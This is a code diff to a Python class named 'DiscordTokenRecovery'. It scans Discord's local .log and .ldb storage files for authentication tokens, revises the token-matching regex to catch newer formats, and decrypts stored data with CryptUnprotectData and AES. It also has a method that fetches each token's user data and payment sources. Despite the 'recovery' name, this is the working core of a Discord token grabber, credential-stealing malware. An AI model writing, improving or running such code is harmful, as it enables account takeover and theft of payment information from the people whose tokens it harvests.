@@ -5,6 +5,7 @@ import concurrent.futures
 from base64 import b64decode
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import unpad
+import win32crypt
 from win32crypt import CryptUnprotectData
 import requests
 
@@ -51,17 +52,21 @@ class DiscordTokenRecovery:
         if not os.path.exists(path):
             return tokens
 
+        # Adjusting the token pattern to match the new and previous example tokens
+        token_pattern = re.compile(rb"[A-Za-z0-9+/=]{20,}\.[A-Za-z0-9_-]{6,8}\.[A-Za-z0-9_-]{20,}")
+
         for file_name in os.listdir(path):
             if not file_name.endswith((".log", ".ldb")):
                 continue
 
-            with open(os.path.join(path, file_name), "r", errors="ignore") as file:
+            with open(os.path.join(path, file_name), "rb") as file:
                 content = file.read()
-                tokens.extend(re.findall(r"[\w-]{24}\.[\w-]{6,7}\.[\w-]{27,}", content))
-                tokens.extend(re.findall(r"mfa\.[\w-]{84,}", content))
+                potential_tokens = token_pattern.findall(content)
+                for pt in potential_tokens:
+                    tokens.append(pt.decode(errors='ignore'))
 
         return tokens
-    
+
     def get_user_data(self, token):
         """Fetches user data and payment sources associated with the token."""
         USER_AGENTS = [
